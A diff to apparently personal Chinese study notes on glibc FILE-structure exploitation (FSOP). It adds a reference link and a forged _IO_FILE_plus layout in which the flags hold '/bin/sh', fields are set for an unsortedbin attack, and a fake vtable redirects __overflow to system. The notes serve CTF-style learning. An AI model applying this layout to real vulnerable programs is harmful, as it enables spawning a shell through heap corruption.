@@ -3,6 +3,8 @@
 https://ywhkkx.github.io/2022/03/16/IO_FILE%20pwn/
 https://blog.csdn.net/aptx4869_li/article/details/122971995
 
+FSOP描述的最清晰易懂的文章https://ywhkkx.github.io/2022/04/01/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9AFSOP/
+
 ![Alt text](image.png)
 
 FILE结构在程序执行fopen等函数时会进行创建，分配在堆中，以链表的形式串联。  
@@ -102,3 +104,42 @@ struct _IO_jump_t
 
 vtable 劫持
 p*(struct _IO_jump_t*)_IO_list_all.vtable
+
+FSOP构造结构
+
+```
+
+IO_FILE_plus struct:
+{
+     _flags:  0x68732f6e69622f  / / / bin / sh
+     _IO_read_ptr:  0x61        / / overwrite old_top_chunk's size
+     _IO_read_end:  0x0
+     _IO_read_base:  0x7fde9e8af510  / / 篡改bk，unsortedbin attack
+     _IO_write_base:  0x0      / / 0
+     _IO_write_ptr:  0x1       / / 1
+     _IO_write_end:  0x0
+     _IO_buf_base:  0x0
+     _IO_buf_end:  0x0
+     _IO_save_base:  0x0
+     _IO_backup_base:  0x0
+     _IO_save_end:  0x0
+     _markers:  0x0         / / fake_vtable
+     _chain:  0x0
+     _fileno:  0x0
+     _flags2:  0x0
+     _old_offset:  0x7fde9e52f3a0   / / 将fake_vtable的__overflow篡改为system地址
+     _cur_column:  0x0
+     _vtable_offset:  0x0
+     _shortbuf:  0x0
+     _lock:  0x0
+     _offset:  0x0
+     _codecvt:  0x0
+     _wide_data:  0x0
+     _freeres_list:  0x0
+     _freeres_buf:  0x0
+     __pad5:  0x0
+     _mode:  0x0       / / 0
+     _unused2:  0x0
+     vtable:  0x55f8c948f550   / / 指向top[ 12 ]，即_markers的地址
+}
+```
